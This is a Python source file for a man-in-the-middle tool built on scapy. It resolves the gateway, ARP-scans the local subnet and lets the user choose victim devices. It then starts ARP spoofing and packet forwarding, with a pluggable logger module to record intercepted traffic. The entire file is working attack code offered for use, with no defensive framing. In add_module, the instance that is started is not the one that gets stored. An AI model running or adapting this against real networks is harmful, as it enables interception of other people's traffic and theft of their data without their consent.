from scapy.all import *
from scapy.layers.l2 import *
import threading
from engine.arp import ARPSpoofer
from engine.forwarder import Forwarder
from engine.modules.logger import LoggerModule

class MITMEngine:
    def __init__(self):
        self.targets = []
        self.network_devices = []
        self.gateway_ip = None
        self.gateway_mac = None
        self.my_mac = None
        self.spoofing = False
        self.stop_event = threading.Event()
        self.modules = []
        self._arp = None
        self._forwarder = None
        self._spoof_thread = None

    def initialize(self):
        self.gateway_ip = conf.route.route("0.0.0.0")[2]
        self.gateway_mac = self.get_mac(self.gateway_ip)
        self.my_mac = get_if_hwaddr(conf.iface)
        if not self.gateway_ip:
            raise Exception("Failed to resolve gateway IP")
        if not self.gateway_mac:
            raise Exception("Failed to resolve gateway MAC")
        if not self.my_mac:
            raise Exception("Failed to resolve machine's MAC")

    def get_mac(self, ip):
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        answered, _ = srp(packet, timeout=3, verbose=0)
        if answered:
            return answered[0][1].hwsrc
        return None

    def scan(self, args=None):
        self.network_devices.clear()
        ip_range = ".".join(self.gateway_ip.split(".")[:3]) + ".0/24"
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
        result = srp(packet, timeout=3, verbose=0)[0]
        for sent, received in result:
            self.network_devices.append({"ip": received.psrc, "mac": received.hwsrc})
        for index, device in enumerate(self.network_devices):
            marker = "[V]" if device in self.targets else "   "
            print(f"{index}. {marker} {device['ip']} : {device['mac']}")

    def set_target(self, args):
        if len(args) != 1 or not args[0].isdigit() or int(args[0]) >= len(self.network_devices):
            print("Error! Provide a valid device index from scan.")
            return
        if self.network_devices[int(args[0])] not in self.targets:
            self.targets.append(self.network_devices[int(args[0])])

    def show_targets(self, args=None):
        for target in self.targets:
            print(target["ip"] + " : " + target["mac"])

    def start_spoof(self, args=None):
        if self.spoofing:
            print("Already spoofing!")
            return
        if not self.targets:
            print("No targets set.")
            return

        self.stop_event.clear()
        self._arp = ARPSpoofer(self.targets, self.gateway_ip, self.gateway_mac, self.my_mac, self.stop_event)
        self._forwarder = Forwarder(self.targets, self.gateway_ip, self.gateway_mac, self.my_mac, self.modules)

        target_ips = " or ".join(f"host {t['ip']}" for t in self.targets)
        filter_str = f"not arp and (host {self.gateway_ip} or {target_ips})"

        for module in self.modules:
            module.start()

        self._forwarder.start(filter_str)
        self._spoof_thread = threading.Thread(target=self._arp.spoof_loop)
        self._spoof_thread.start()
        self.spoofing = True

    def stop_spoof(self, args=None):
        if not self.spoofing:
            print("Not currently spoofing.")
            return
        self.stop_event.set()
        self._spoof_thread.join()
        self._forwarder.stop()
        self._arp.restore_all()

        for module in self.modules:
            module.stop()

        self.spoofing = False
        print("Stopped.")

    def add_module(self, args):
        available = {
            "logger": LoggerModule
        }
        if len(args) != 1 or args[0] not in available:
            print("Available modules: " + ", ".join(available.keys()))
            return
        module = available[args[0]]()
        if self.spoofing:
            module.start()
        self.modules.append(available[args[0]]())
        print(f"Module '{args[0]}' added.")